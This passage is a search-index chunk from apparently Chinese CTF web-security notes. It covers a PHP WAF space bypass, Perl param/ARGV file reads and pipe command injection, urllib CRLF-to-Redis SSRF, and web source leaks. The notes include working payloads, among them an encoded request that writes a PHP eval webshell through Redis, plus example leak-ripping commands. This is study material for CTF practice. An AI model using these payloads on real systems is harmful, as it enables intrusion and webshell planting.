Text\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E7%A9%BA%E6%A0%BC%E4%B8%8EWAF/","title":"\u7a7a\u683c\u4e0eWAF","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/%E7%A9%BA%E6%A0%BC%E4%B8%8EWAF/#wafnum","title":"\u5047\u5982waf\u4e0d\u5141\u8bb8num\u53d8\u91cf\u4f20\u9012\u5b57\u6bcd\uff1a","text":"<p>http://www.xxx.com/index.php?num=aaaa   //\u663e\u793a\u975e\u6cd5\u8f93\u5165\u7684\u8bdd</p> <p>\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5728num\u524d\u52a0\u4e2a\u7a7a\u683c\uff1a</p> <p>http://www.xxx.com/index.php?num= aaaa</p> <p>\u8fd9\u6837waf\u5c31\u627e\u4e0d\u5230num\u8fd9\u4e2a\u53d8\u91cf\u4e86\uff0c\u56e0\u4e3a\u73b0\u5728\u7684\u53d8\u91cf\u53eb\u201c num\u201d\uff0c\u800c\u4e0d\u662f\u201cnum\u201d\u3002\u4f46php\u5728\u89e3\u6790\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u628a\u7a7a\u683c\u7ed9\u53bb\u6389\uff0c\u8fd9\u6837\u6211\u4eec\u7684\u4ee3\u7801\u8fd8\u80fd\u6b63\u5e38\u8fd0\u884c\uff0c\u8fd8\u4e0a\u4f20\u4e86\u975e\u6cd5\u5b57\u7b26\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Perl/PARAM/","title":"PARAM","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Perl/PARAM/#csaw-ctf-2016-quals-i-got-id-200","title":"csaw-ctf-2016-quals i-got-id-200","text":"<p>my file_name =param(field_name);</p> <p>\u83b7\u53d6\u4e0a\u4f20\u7684\u6587\u4ef6\u540d \u540e\u8005post\u6216\u8005get\u7684\u6570\u636e.</p> <p>param()\u51fd\u6570\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5217\u8868\u7684\u6587\u4ef6\u4f46\u662f\u53ea\u6709\u7b2c\u4e00\u4e2a\u6587\u4ef6\u4f1a\u88ab\u653e\u5165\u5230\u4e0b\u9762\u7684\u63a5\u6536\u53d8\u91cf\u4e2d\u3002\u5982\u679c\u6211\u4eec\u4f20\u5165\u4e00\u4e2aARGV\u7684\u6587\u4ef6\uff0c\u90a3\u4e48Perl\u4f1a\u5c06\u4f20\u5165\u7684\u53c2\u6570\u4f5c\u4e3a\u6587\u4ef6\u540d\u8bfb\u51fa\u6765\u3002\u5bf9\u6b63\u5e38\u7684\u4e0a\u4f20\u6587\u4ef6\u8fdb\u884c\u4fee\u6539,\u53ef\u4ee5\u8fbe\u5230\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u7684\u76ee\u7684</p> <p>ARGV(\u76f8\u5f53\u4e8e\u672c\u9898\u76ee\u7684\u63a5\u53d7\u53d8\u91cf\u7684\u6570\u7ec4\uff0c\u8fd9\u4e2a\u6570\u7ec4\u91cc\u9762\u7684\u5185\u5bb9\u4f5c\u4e3a\u547d\u4ee4\u884c\u53ef\u4ee5\u6267\u884c\uff0c\u76f8\u5f53\u4e8e\u662fparam()\u63a5\u53d7get\u5230\u7684\u53c2\u6570\u5e76\u4e14\u653e\u5728ARGV\u4e2d\uff0c\u7136\u540eARFV\u4e2d\u9ed8\u8ba4\u5c31\u9ed8\u8ba4\u8c03\u7528\u6267\u884c)</p> <p>perl\u5c06perl\u547d\u4ee4\u884c\u7684\u53c2\u6570\u5217\u8868\u653e\u8fdb\u6570\u7ec4ARGV(@ARGV)\u4e2d\u3002\u65e2\u7136\u662f\u6570\u7ec4\uff0c\u5c31\u53ef\u4ee5\u8bbf\u95ee($ARGV[n])\u3001\u904d\u5386\uff0c\u751a\u81f3\u4fee\u6539\u6570\u7ec4\u5143\u7d20</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Perl/%E7%AE%A1%E9%81%93%E7%AC%A6/","title":"\u7ba1\u9053\u7b26","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/Perl/%E7%AE%A1%E9%81%93%E7%AC%A6/#bmzctf-hitcon_2017_ssrfme","title":"BMZCTF hitcon_2017_ssrfme","text":"<p>perl\u51fd\u6570\u770b\u5230\u8981\u6253\u5f00\u7684\u6587\u4ef6\u540d\u4e2d\u5982\u679c\u4ee5\u7ba1\u9053\u7b26\uff08\u952e\u76d8\u4e0a\u90a3\u4e2a\u7ad6\u6760\uff09\u7ed3\u5c3e\uff0c\u5c31\u4f1a\u4e2d\u65ad\u539f\u6709\u6253\u5f00\u6587\u4ef6\u64cd\u4f5c\uff0c\u5e76\u4e14\u628a\u8fd9\u4e2a\u6587\u4ef6\u540d\u5f53\u4f5c\u4e00\u4e2a\u547d\u4ee4\u6765\u6267\u884c\uff0c\u5e76\u4e14\u5c06\u547d\u4ee4\u7684\u6267\u884c\u7ed3\u679c\u4f5c\u4e3a\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u5199\u5165\u3002\u8fd9\u4e2a\u547d\u4ee4\u7684\u6267\u884c\u6743\u9650\u662f\u5f53\u524d\u7684\u767b\u5f55\u8005\u3002\u5982\u679c\u4f60\u6267\u884c\u8fd9\u4e2a\u547d\u4ee4\uff0c\u4f60\u4f1a\u770b\u5230perl\u7a0b\u5e8f\u8fd0\u884c\u7684\u7ed3\u679c\u3002</p> <p>url=file:cat/flag|&amp;filename=/123.txt</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/python2_python3/python3/Redis/","title":"Redis","text":"<p>http://redisdoc.com/string/set.html </p> <p>\u4e0a\u9762\u7684\u94fe\u63a5\u65f6redis\u7684\u6307\u4ee4\u53c2\u8003\u96c6\uff0c\u5b9e\u9645\u4f7f\u7528\u7684\u540c\u65f6\u5e76\u4e0d\u4f1a\u5168\u90e8\u7528\u4e0a\uff0c\u53ea\u4f1a\u4f7f\u7528\u5230\u90e8\u5206\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/python2_python3/python3/Redis/#python-urllib-ssrf","title":"python urllib SSRF","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/python2_python3/python3/Redis/#redis_1","title":"\u5982\u4f55\u653b\u51fbRedis","text":"<p>\u4e24\u79cd\u65b9\u6848\uff0c\u5177\u4f53\u770b\u53c2\u8003\u94fe\u63a5\u3002\u539f\u7406\u90fd\u662f\u4e00\u6837\u7684\uff0c\u5199\u6587\u4ef6\u5230\u76ee\u6807\u76ee\u5f55\u3002</p> <pre><code>CONFIG SET dir /tmp\nCONFIG SET dbfilename evil  //\u8fd9\u4e00\u6b65\u53ef\u4ee5\u5c06db\u8bbe\u7f6e\u4e3a/tmp/evil,\u53ef\u4ee5\u63a7\u5236\u6587\u4ef6\u91cc\u9762\u7684\u90e8\u5206\u6570\u636e\u4e86\u3002\nSET foo bar\nSAVE\n</code></pre> <p>\u4e0a\u8ff0Redis\u547d\u4ee4\u53ef\u4ee5\u4f7f<code>key-value</code>\u6570\u636e\u4fdd\u5b58\u5728<code>/tmp/evil</code>\u6587\u4ef6\u4e2d\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u91cc\u9762\u7684\u90e8\u5206\u5185\u5bb9\uff1a </p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/python2_python3/python3/Redis/#0x02-python-urllib-httpcrlfssrf","title":"0x02 Python urllib HTTP\u5934\u6ce8\u5165(crlf+ssrf)","text":"<p>\u7b80\u5355\u4f7f\u7528\u4e00\u4e0b\u4ee3\u7801\u6d4b\u8bd5\u8bbf\u95eeurl\uff1a</p> <pre><code>import urllib\nimport sys\n\nurllib.urlopen(sys.argv[1])\n</code></pre> <p>\u8fd9\u91cc\u662f\u4e2aSSRF\u6f0f\u6d1e\uff0c\u5f53\u8f93\u5165\u4e00\u4e0bpayload\uff0c\u8fd8\u80fd\u6ce8\u5165\u6211\u4eec\u60f3\u8981\u7684http\u5934\u6570\u636e\uff1a \u8f93\u5165\uff1a</p> <pre><code>python urlopen.py http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo\n</code></pre> <p>\u76d1\u542c\u672c\u673a12345\u7aef\u53e3\uff0c\u5f97\u5230\u53d1\u5305\u6570\u636e\uff1a</p> <pre><code>GET /foo HTTP/1.0\nHost: 127.0.0.1\nX-injected: header  //\u5934\u6570\u636e\u6ce8\u5165\nx-leftover: :12345\nUser-Agent: Python-urllib/1.17\n</code></pre> <p>\u4e0d\u4ec5\u5982\u6b64\uff0c\u8fd8\u53ef\u4ee5\u6539\u53d8\u8bf7\u6c42\u6784\u9020\u4e3aPOST\u6570\u636e\u3002\u5177\u4f53\u53c2\u8003\u94fe\u63a51\u3002\u548cGopher\u534f\u8bae\u6709\u540c\u6837\u7684\u5999\u7528\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/python2_python3/python3/Redis/#0x03-redis","title":"0x03 \u7ed3\u5408\u653b\u51fbRedis","text":"<p>\u53d1\u9001payload\u5230\u5185\u7f51Redis\u7aef\u53e3\uff1a</p> <pre><code>http://192.168.0.7%0d%0aSET%20A%20EVIL%0d%0a:6379/foo\n</code></pre> <p>\u53ef\u4ee5\u5728Redis\u4e2d\u6dfb\u52a0<code>A:EVIL</code>\u7684\u952e\u503c\u5bf9,\u5373\uff1a\u6267\u884c\u4e86<code>SET A EVIL</code>\u547d\u4ee4\u3002\u6570\u636e\u5305\u4e3a\uff1a</p> <pre><code>GET /foo HTTP/1.0\nHost: 192.168.0.7\nSET A EVIL\n:12345\nUser-Agent: Python-urllib/1.17\n</code></pre> <p></p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/python2_python3/python3/Redis/#0x04-shell","title":"0x04 \u5b9e\u9645shell\u653b\u51fb","text":""},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/python2_python3/python3/Redis/#1","title":"1. \u5199\u5165\u7a7a\u683c\u9650\u5236","text":"<p>Redis\u534f\u8bae\u7a81\u7834\u7a7a\u683c\u9650\u5236\uff1a</p> <pre><code>*3\n$3\nSET\n$1\nA\n$9\ntest you\n</code></pre> <p>url\u7f16\u7801\u5f97\u5230payload\uff1a</p> <pre><code>http://192.168.0.7%0D%0A%2a3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0AA%0D%0A%248%0D%0Atest%20you%0D%0A:6379/foo\n</code></pre> <p>\u6d4b\u8bd5\u7ed3\u679c\u5982\u4e0b\uff0c\u6210\u529f\u6267\u884c\u547d\u4ee4\uff1a</p> <pre><code>127.0.0.1:6379&gt; get A\n\"EVIL\"\n127.0.0.1:6379&gt; get A\n\"test you\"\n</code></pre>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/python2_python3/python3/Redis/#2","title":"2. \u7efc\u5408\u5229\u7528\u5199\u6587\u4ef6","text":"<p>\u6d4b\u8bd5payload\u76f4\u63a5\u5199\u6587\u4ef6\uff1a redis\u539f\u547d\u4ee4\uff1a</p> <pre><code>SET foo \\n&lt;?php @eval($_POST[c][/c]);?&gt;\\n\nCONFIG SET dir /tmp\nCONFIG SET dbfilename webshell\nSAVE\n</code></pre> <p>\u5373\uff1a</p> <pre><code>*3\n$3\nSET\n$5\nshell\n$27\n\\n&lt;?php @eval($_POST[c][/c]);?&gt;\\n\nCONFIG SET dir /tmp\nCONFIG SET dbfilename webshell123\nSAVE\n</code></pre> <p>\u6309\u7167\u4e0a\u8ff0\u7f16\u7801\u89c4\u5219\u53ef\u5f97payload\uff1a</p> <pre><code>python urlopen.py http://192.168.0.7%0D%0A%2a3%0D%0A%243%0D%0ASET%0D%0A%245%0D%0Ashell%0D%0A%2427%0D%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5Bc%5D%29%3B%3F%3E%0A%0D%0ACONFIG%20SET%20dir%20%2ftmp%0D%0ACONFIG%20SET%20dbfilename%20webshell123%0D%0ASAVE%0D%0A:6379/foo\n</code></pre> <p>\u6210\u529f\u5199\u5165shell\u5230/tmp/webshell123\u6587\u4ef6\u4e2d\uff0c\u6587\u4ef6\u5185\u5bb9\u5982\u4e0b\uff1a  \u5b9a\u65f6\u4efb\u52a1\u53cd\u5f39shell\u548c\u6dfb\u52a0ssh-key\u65b9\u6cd5\uff0c\u8be6\u89c1\u94fe\u63a52\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/python2_python3/python3/Redis/#swpuctf-2016web7","title":"\u6837\u4f8b\uff1a[SWPUCTF 2016]Web7","text":"<pre><code>http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0a:6379/foo\n\u6570\u636e\u5e93\u4fdd\u5b58\u4f4d\u7f6e\u4fee\u6539\n</code></pre> <pre><code>import requests\n\nurl = \"http://6fe99eb6-b7ba-4e34-b5b4-6ce622aca224.node4.buuoj.cn/input\"\ndata = {\"url\":\"http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0a:6379/foo\",\n        \"submit\":\"submit\"}\ndata1 = {\n\n}\nwhile (1) :\n    r = requests.post(url=url, data=data)\n    print (r.text)\n\u5bc6\u7801\u4fee\u6539\n</code></pre>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%9A%84%E4%B8%80%E4%BA%9Btrick/","title":"CTF\u6bd4\u8d5b\u4e2d\u4fe1\u606f\u641c\u96c6\u7684\u4e00\u4e9btrick","text":"<p>1.hint\u6216\u6e90\u7801\u85cf\u5728html\u6e90\u7801\u4e2d</p> <p>\u591a\u51c6\u5907\u51e0\u79cd\u65b9\u6cd5\u4ee5\u514d\u67d0\u4e9b\u65b9\u6cd5\u5931\u6548</p> <p>1\uff09\u6309F12\u67e5\u770b\u6e90\u7801</p> <p>2\uff09\u5728\u7f51\u5740\u6dfb\u52a0view-source:</p> <p>3\uff09\u76f4\u63a5\u4fdd\u5b58html\u6e90\u7801\u5230\u672c\u5730\uff0cFirefox\u4e0b\u76f4\u63a5\u6309Ctril+s\uff0c\u518d\u67e5\u770b\u6e90\u7801</p> <p>2.hint\u6216\u6e90\u7801\u85cf\u5728http\u4fe1\u606f\u91cc</p> <p>burpsuite\u6293\u5305\u68c0\u67e5</p> <p>3.\u85cf\u5728robots.txt\u91cc</p> <p>\u6ce8\u610f\u522b\u62fc\u9519</p> <ol> <li>www.zip\u7b49\u7c7b\u578b\u6cc4\u9732</li> </ol> <p>\u53ef\u4ee5\u76f4\u63a5\u626b\u51fa\u6765</p> <ol> <li>gitsvn\u7b49\u6cc4\u9732</li> </ol> <p>/.git/.svn</p> <p>\u4e5f\u662f\u4e0a\u5de5\u5177\u626b\u63cf</p> <p>6.vim\u4fee\u6539\u6587\u4ef6\u4f1a\u4ea7\u751f\u4e00\u4e2a\u4e34\u65f6\u4fdd\u5b58\u6587\u4ef6\uff0c\u8bbf\u95eeindex.php.swp</p> <p>7.\u85cf\u5728cookie\u91cc</p> <p>\u540cburp\u6293\u5305\u68c0\u67e5</p> <p>8.\u85cf\u5728DNS\u68c0\u67e5\u4fe1\u606f\u91cc</p> <p>\u5982\u56fe</p> <p></p> <p>\u963f\u91cc\u4e91\u8fd0\u7ef4\u68c0\u6d4b\u5e73\u53f0</p> <p>https://zijian.aliyun.com/</p> <p>9.\u67e5\u770bJS\u6e90\u7801</p> <p>10.\u5229\u7528\u7279\u5b9a\u7684\u6570\u636e\u5e93\u7684\u9ed8\u8ba4\u6587\u4ef6\u4f4d\u7f6e</p> <p>11./editor \u6216\u8005 /admin\u7b49\u7b49</p> <p>12.PING\u4e00\u4e0b\u770b\u770b</p> <p>ping\u68c0\u6d4b\u7ad9\u957f\u5de5\u5177</p> <p>http://ping.chinaz.com/</p> <p>13.PHP\u63a2\u9488\u5229\u7528</p> <p>\u6b22\u8fce\u8865\u5145</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/","title":"\u5341\u5927\u5e38\u89c1\u7684Web\u6e90\u7801\u6cc4\u6f0f\u6f0f\u6d1e\u53ca\u5176\u5229\u7528","text":"<p>Web\u6e90\u7801\u6cc4\u9732\u7684\u6f0f\u6d1e\uff1a</p> <ul> <li>git\u6e90\u7801\u6cc4\u9732</li> <li>svn\u6e90\u7801\u6cc4\u9732</li> <li>hg\u6e90\u7801\u6cc4\u6f0f</li> <li>CVS\u6cc4\u9732</li> <li>Bazaar/bzr\u6cc4\u9732</li> <li>\u7f51\u7ad9\u5907\u4efd\u538b\u7f29\u6587\u4ef6</li> <li><code>WEB-INF/web.xml</code>\u6cc4\u9732</li> <li>DS_Store \u6587\u4ef6\u6cc4\u9732</li> <li>SWP \u6587\u4ef6\u6cc4\u9732</li> <li>GitHub\u6e90\u7801\u6cc4\u6f0f</li> </ul>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#1git","title":"1\u3001git \u6e90\u7801\u6cc4\u9732","text":"<p>Git\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u5206\u5e03\u5f0f\u7248\u672c\u63a7\u5236\u7cfb\u7edf\uff0c\u5728\u6267\u884c<code>git init</code>\u521d\u59cb\u5316\u76ee\u5f55\u7684\u65f6\u5019\uff0c\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a<code>.git</code>\u76ee\u5f55\uff0c\u7528\u6765\u8bb0\u5f55\u4ee3\u7801\u7684\u53d8\u66f4\u8bb0\u5f55\u7b49\u3002\u53d1\u5e03\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u5982\u679c\u6ca1\u6709\u628a<code>.git</code>\u8fd9\u4e2a\u76ee\u5f55\u5220\u9664\uff0c\u5c31\u76f4\u63a5\u53d1\u5e03\u5230\u4e86\u670d\u52a1\u5668\u4e0a\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u901a\u8fc7\u5b83\u6765\u6062\u590d\u6e90\u4ee3\u7801\u3002</p> <p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1aGitHack</p> <p>github\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/lijiejie/GitHack</p> <p>\u7528\u6cd5\u793a\u4f8b\uff1a</p> <p><pre><code>GitHack.py http://www.openssl.org/.git/\n</code></pre> \u4fee\u590d\u5efa\u8bae\uff1a\u5220\u9664.git\u76ee\u5f55\u6216\u8005\u4fee\u6539\u4e2d\u95f4\u4ef6\u914d\u7f6e\u8fdb\u884c\u5bf9.git\u9690\u85cf\u6587\u4ef6\u5939\u7684\u8bbf\u95ee\u3002</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#2svn","title":"2\u3001SVN \u6e90\u7801\u6cc4\u9732","text":"<p>SVN\u662f\u4e00\u4e2a\u5f00\u653e\u6e90\u4ee3\u7801\u7684\u7248\u672c\u63a7\u5236\u7cfb\u7edf\u3002\u5728\u4f7f\u7528SVN\u7ba1\u7406\u672c\u5730\u4ee3\u7801\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u81ea\u52a8\u751f\u6210\u4e00\u4e2a\u540d\u4e3a.svn\u7684\u9690\u85cf\u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u5305\u542b\u91cd\u8981\u7684\u6e90\u4ee3\u7801\u4fe1\u606f\u3002\u7f51\u7ad9\u7ba1\u7406\u5458\u5728\u53d1\u5e03\u4ee3\u7801\u65f6\uff0c\u6ca1\u6709\u4f7f\u7528\u2018\u5bfc\u51fa\u2019\u529f\u80fd\uff0c\u800c\u662f\u76f4\u63a5\u590d\u5236\u4ee3\u7801\u6587\u4ef6\u5939\u5230WEB\u670d\u52a1\u5668\u4e0a\uff0c\u8fd9\u5c31\u4f7f.svn\u9690\u85cf\u6587\u4ef6\u5939\u88ab\u66b4\u9732\u4e8e\u5916\u7f51\u73af\u5883\uff0c\u53ef\u4ee5\u5229\u7528.svn/entries\u6587\u4ef6\uff0c\u83b7\u53d6\u5230\u670d\u52a1\u5668\u6e90\u7801\u3002</p> <p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1aSeay SVN\u6f0f\u6d1e\u5229\u7528\u5de5\u5177</p> <p>\u4fee\u590d\u5efa\u8bae\uff1a\u5220\u9664web\u76ee\u5f55\u4e2d\u6240\u6709.svn\u9690\u85cf\u6587\u4ef6\u5939\uff0c\u5f00\u53d1\u4eba\u5458\u5728\u4f7f\u7528SVN\u65f6\uff0c\u4e25\u683c\u4f7f\u7528\u5bfc\u51fa\u529f\u80fd\uff0c\u7981\u6b62\u76f4\u63a5\u590d\u5236\u4ee3\u7801\u3002</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#3hg","title":"3\u3001hg\u6e90\u7801\u6cc4\u6f0f","text":"<p>Mercurial \u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u5206\u5e03\u5f0f\u7248\u672c\u63a7\u5236\u7cfb\u7edf\uff0c\u4f7f\u7528<code>hg init</code>\u7684\u65f6\u5019\u4f1a\u751f\u6210.hg\u3002</p> <p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1a dvcs-ripper</p> <p>github\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/kost/dvcs-ripper</p> <p>\u7528\u6cd5\u793a\u4f8b\uff1a</p> <pre><code>rip-hg.pl -v -u http://www.example.com/.hg/\n</code></pre>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#4cvs","title":"4\u3001CVS\u6cc4\u9732","text":"<p>CVS\u662f\u4e00\u4e2aC/S\u7cfb\u7edf\uff0c\u591a\u4e2a\u5f00\u53d1\u4eba\u5458\u901a\u8fc7\u4e00\u4e2a\u4e2d\u5fc3\u7248\u672c\u63a7\u5236\u7cfb\u7edf\u6765\u8bb0\u5f55\u6587\u4ef6\u7248\u672c\uff0c\u4ece\u800c\u8fbe\u5230\u4fdd\u8bc1\u6587\u4ef6\u540c\u6b65\u7684\u76ee\u7684\u3002\u4e3b\u8981\u662f\u9488\u5bf9 CVS/Root\u4ee5\u53caCVS/Entries\u76ee\u5f55\uff0c\u76f4\u63a5\u5c31\u53ef\u4ee5\u770b\u5230\u6cc4\u9732\u7684\u4fe1\u606f\u3002</p> <p><pre><code>http://url/CVS/Root \u8fd4\u56de\u6839\u4fe1\u606f\nhttp://url/CVS/Entries \u8fd4\u56de\u6240\u6709\u6587\u4ef6\u7684\u7ed3\u6784\n</code></pre> \u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1advcs-ripper github\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/kost/dvcs-ripper.git</p> <p>\u8fd0\u884c\u793a\u4f8b:</p> <pre><code>rip-cvs.pl -v -u http://www.example.com/CVS/\n</code></pre>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#5bazaarbzr","title":"5\u3001Bazaar/bzr\u6cc4\u9732","text":"<p>bzr\u4e5f\u662f\u4e2a\u7248\u672c\u63a7\u5236\u5de5\u5177, \u867d\u7136\u4e0d\u662f\u5f88\u70ed\u95e8, \u4f46\u5b83\u4e5f\u662f\u591a\u5e73\u53f0\u652f\u6301, \u5e76\u4e14\u6709\u4e0d\u9519\u7684\u56fe\u5f62\u754c\u9762\u3002</p> <p>\u8fd0\u884c\u793a\u4f8b\uff1a</p> <pre><code>rip-bzr.pl -v -u http://www.example.com/.bzr/\n</code></pre>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#6","title":"6\u3001\u7f51\u7ad9\u5907\u4efd\u538b\u7f29\u6587\u4ef6","text":"<p>\u7ba1\u7406\u5458\u5c06\u7f51\u7ad9\u6e90\u4ee3\u7801\u5907\u4efd\u5728Web\u76ee\u5f55\u4e0b\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u731c\u89e3\u6587\u4ef6\u8def\u5f84\uff0c\u4e0b\u8f7d\u5907\u4efd\u6587\u4ef6\uff0c\u5bfc\u81f4\u6e90\u4ee3\u7801\u6cc4\u9732\u3002</p> <p>\u5e38\u89c1\u7684\u5907\u4efd\u6587\u4ef6\u540e\u7f00\uff1a</p> <ul> <li>.rar</li> <li>.zip</li> <li>.7z</li> <li>.tar.gz</li> <li>.bak</li> <li>.txt</li> <li>.old</li> <li>.temp</li> </ul> <p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\uff1a\u5fa1\u5251</p>"},{"location":"web/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/%E5%8D%81%E5%A4%A7%E5%B8%B8%E8%A7%81%E7%9A%84Web%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/#7web-infwebxml","title":"7\u3001<code>WEB-INF/web.xml</code>\u6cc4\u9732","text":"<p><code>WEB-INF</code>\u662fJava\u7684WEB\u5e94\u7528\u7684\u5b89\u5168\u76ee\u5f55\uff0c\u5982\u679c\u60f3\u5728\u9875\u9762\u4e2d\u76f4\u63a5\u8bbf\u95ee\u5176\u4e2d\u7684\u6587\u4ef6\uff0c\u5fc5\u987b\u901a\u8fc7web.xml\u6587\u4ef6\u5bf9\u8981\u8bbf\u95ee\u7684\u6587\u4ef6\u8fdb\u884c\u76f8\u5e94\u6620\u5c04\u624d\u80fd\u8bbf\u95ee\u3002</p> <p><code>WEB-INF</code>\u4e3b\u8981\u5305\u542b\u4e00\u4e0b\u6587\u4ef6\u6216\u76ee\u5f55\uff1a</p> <p><pre><code>WEB-INF/web.xml : Web\u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u6587\u4ef6, \u63cf\u8ff0\u4e86servlet\u548c\u5176\u4ed6\u7684\u5e94\u7528\u7ec4\u4ef6\u914d\u7f6e\u53ca\u547d\u540d\u89c4\u5219.\nWEB-INF/database.properties : \u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\nWEB-INF/classes/ : \u4e00\u822c\u7528\u6765\u5b58\u653eJava\u7c7b\u6587\u4ef6(.class)\nWEB-INF/lib/ : 